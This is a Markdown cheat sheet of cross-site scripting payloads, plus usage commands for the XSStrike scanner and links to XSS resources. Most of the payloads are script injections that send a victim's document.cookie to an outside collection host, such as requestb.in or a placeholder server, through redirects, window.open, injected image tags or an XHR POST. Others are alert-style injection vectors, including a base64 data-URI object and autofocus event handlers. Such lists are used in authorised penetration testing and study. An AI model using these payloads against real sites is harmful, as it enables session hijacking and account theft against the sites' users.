# xss-hacking

## Payloads

### Document.location
```js
<script>document.location('http://IP_EXTERNE/'+document.cookie)</script>
<script>document.location.href = 'http://requestb.in/XXXXXX?cookies =' + document.cookie;</script>
```

### Window
```js
<script>window.open("http://monserveur/Cookie="+document.cookie)</script>
<script>window.location='http://monsite.free.fr/script.php?cookies='+(document.cookie);</script>
```

### Document.write
```js
<script>document.write('<img src="https://requestb.in/xxxxx?cookie="+document.cookie>admin</img>');</script>
admin"></i>)</span><script>document.write("<img src=http://requestb.in/XXXXX?cookie=".concat(encodeURI(document.cookie)).concat("/>"))</script><i>
```
```js
<script>var xhr = new XMLHttpRequest();xhr.open('POST', 'http://requestb.in/w0sw22w0', true);xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');xhr.send(document.cookie);</script>
```

### alert(1) in JS
```js
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>

injecting inside of input tags
<input/onfocus=alert(0) autofocus>
<input/onfocus=alert`0` autofocus>
<input/onfocus=prompt`0` autofocus>
1'"><input/onfocus={alert`1`} autofocus> 
```

## XSStrike

Cross Site Scripting detection suite equipped with parsers
XSStrike analyses the response with multiple parsers and then crafts payloads
that are guaranteed to work by context analysis integrated with a fuzzing engine

### Documentation

* ![XSStrike Documentation](https://github.com/s0md3v/XSStrike/wiki/Usage)

### Classical GET
```python
python xsstrike.py -u "http://example.com/search.php?q=query"
```

### POST
```python
python xsstrike.py -u "http://example.com/search.php" --data "q=query"
```

### Path payloads
```python
python xsstrike.py -u "http://example.com/search/form/query" --path
```

### Crawl and test
```python
python xsstrike.py -u "http://example.com/page.php" --crawl
```

### Load payloads from file and test them
```python
python3 xsstrike.py -u "http://example.com/page.php?q=query" -f /path/to/file.txt
```

### Find hidden parameters
```python
python xsstrike.py -u "http://example.com/page.php" --params
```

## Resources

https://html5sec.org/

https://gbhackers.com/top-500-important-xss-cheat-sheet/

https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot

https://github.com/s0md3v/AwesomeXSS/